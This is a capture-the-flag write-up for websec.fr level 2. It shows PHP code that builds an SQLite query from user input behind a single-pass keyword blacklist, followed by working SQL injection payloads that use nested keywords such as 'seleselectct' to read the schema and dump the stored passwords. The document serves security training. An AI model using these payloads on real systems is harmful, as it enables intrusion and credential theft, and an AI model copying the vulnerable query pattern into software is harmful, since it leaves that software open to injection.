link: http://websec.fr/level02/index.php
+ Source given
```
<?php
ini_set('display_errors', 'on');

class LevelTwo {
    public function doQuery($injection) {
        $pdo = new SQLite3('leveltwo.db', SQLITE3_OPEN_READONLY);

        $searchWords = implode (['union', 'order', 'select', 'from', 'group', 'by'], '|');
        $injection = preg_replace ('/' . $searchWords . '/i', '', $injection);

        $query = 'SELECT id,username FROM users WHERE id=' . $injection . ' LIMIT 1';
        $getUsers = $pdo->query ($query);
        $users = $getUsers->fetchArray (SQLITE3_ASSOC);

        if ($users) {
            return $users;
        }

        return false;
    }
}

if (isset ($_POST['submit']) && isset ($_POST['user_id'])) {
    $lt = new LevelTwo ();
    $userDetails = $lt->doQuery ($_POST['user_id']);
}
?>
```
+Similar to level 1, but they have blacklisted some of the words like 'union', 'order', 'select', 'from', 'group', 'by'
+ So, how this works is, when it finds any of the above words in our query, it replaces it with nothing
+ preg_replace does only one pass while replacing. So we can use something like this `seleselectct` instead of just select because the inner select gets replaced and what remains is select!
+ So our query will be like:
 `-1 uniunionon seleselectct 1,sql frfromom sqlite_master --`
 output: id -> 1
username -> CREATE TABLE users(id int(7), username varchar(255), password varchar(255))

+ To dump the passwords:
  `-1 uniunionon seleselectct 1, grogroupup_concat(password) frofromm users --`
  output: id -> 1
username -> WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}

`Flag: WEBSEC{BecauseBlacklistsAreOftenAgoodIdea}`
